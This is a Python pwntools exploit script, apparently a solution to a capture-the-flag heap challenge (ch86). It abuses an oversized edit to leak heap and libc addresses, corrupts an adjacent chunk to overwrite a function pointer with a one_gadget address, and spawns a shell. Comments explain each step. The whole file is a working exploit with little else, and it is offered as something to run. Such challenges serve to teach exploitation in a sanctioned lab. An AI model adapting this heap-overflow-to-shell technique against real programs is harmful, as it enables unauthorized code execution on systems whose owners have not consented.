from pwn import * 

context.arch = "x86_64"

global p, libc 

p = process("/challenge/app-systeme/ch86/ch86")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(title, genre):

    p.sendlineafter("> ", "1")
    p.sendlineafter("title: ", title)
    p.sendlineafter("> ", str(genre))

def delete(index):

    p.sendlineafter("> ", "2")
    p.sendlineafter("index: ", str(index))

def play(index):

    p.sendlineafter("> ", "3")
    p.sendlineafter("index: ", str(index))

def edit(index, title):

    p.sendlineafter("> ", "4")
    p.sendlineafter("index: ", str(index))
    p.sendlineafter("title: ", title)

def display(index):

    p.sendlineafter("> ", "5")
    p.sendlineafter("index: ", str(index))


def main():

    #here we abuse the edit function which allows us to read 0x90 bytes even we created a smaller chunk 
    #to leak a heap address so we can use it later 
    #so we create a small chunk and we edit it so it becomes bigger hence we get a heap leak 
    add(b'A' * 0x10, 2) #0
    edit(0, b'B' * 0x87) #edit 0

    display(0)
    p.recvline()
    p.recvline()
    heap_leak = p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')
    heap_leak = u64(heap_leak)

    log.info(f"Heap leak : {hex(heap_leak)}")
    heap_base = heap_leak - 0x10
    log.info(f"Heap base: {hex(heap_base)}")
    
    #Here we do the same thing with heap leak but this time we will leak the address of libc 

    add(b'D' * 0x10, 2) #1
    edit(1, b'E' * 0x87)

    display(1)

    #i worked with try because everytime it leaks random stuffs
    #so it's not sure if we can get a libc leak from the first time 
    #So i made a condition if there is 0x7f in the leaks which is the start of the libc address 

    try:

        p.recvline()
        p.recvline()
        libc_leak = p.recvuntil(b'\n', drop=True)
        
        if b'\x7f' in libc_leak:

            libc_leak = libc_leak.ljust(8, b'\x00')
            libc_leak = u64(libc_leak)
            log.info(f"Libc leak: {hex(libc_leak)}")
            libc_base = libc_leak - 0x3ebca0
            log.info(f"Libc base: {hex(libc_base)}")
            libc.address = libc_base 
            system = libc.symbols['system']
            log.info(f"system : {hex(system)}")
            free_hook = libc.symbols['__free_hook']
            log.info(f"free hook : {hex(free_hook)}")
            one_gadget = libc_base + 0x10a41c
            edit(1, b'E' * 120 + p64(0x31))
            
            
            #here a made a loop to get one chunk after the other so i can edit the address of 
            #our input + the address of `play_raggae` function 

            for i in range(30):

                add(b'Y' * 0x70, 2)
            
            #modify the next chunk where the address of input 3 and it's gender is stored
            #the address of the input doesn't really matter as long as we craft a valid address 
            #for me i just made the address i got from heap leak
            #the address of `play_raggae` i overwrote it the address of one_gadget
            edit(2, b'X' * 0x78 + p64(0x21) + p64(heap_leak) + p64(one_gadget))
            
            play(3)
            p.recv()
            p.sendline("id")
            data = p.recv()

            #i made an if statement because the exploit won't work for the first time due to randomness initialization
            #of the heap 
            #so it took me few runs to spawn a shell 
            if (b'uid') in data:

                print("YEAAAAAAAAAAAAH !")
                p.interactive()
            

            
                

    except:
        log.info(f"Error occured!")


    


if __name__ == "__main__":

    main()

#/challenge/app-systeme/ch86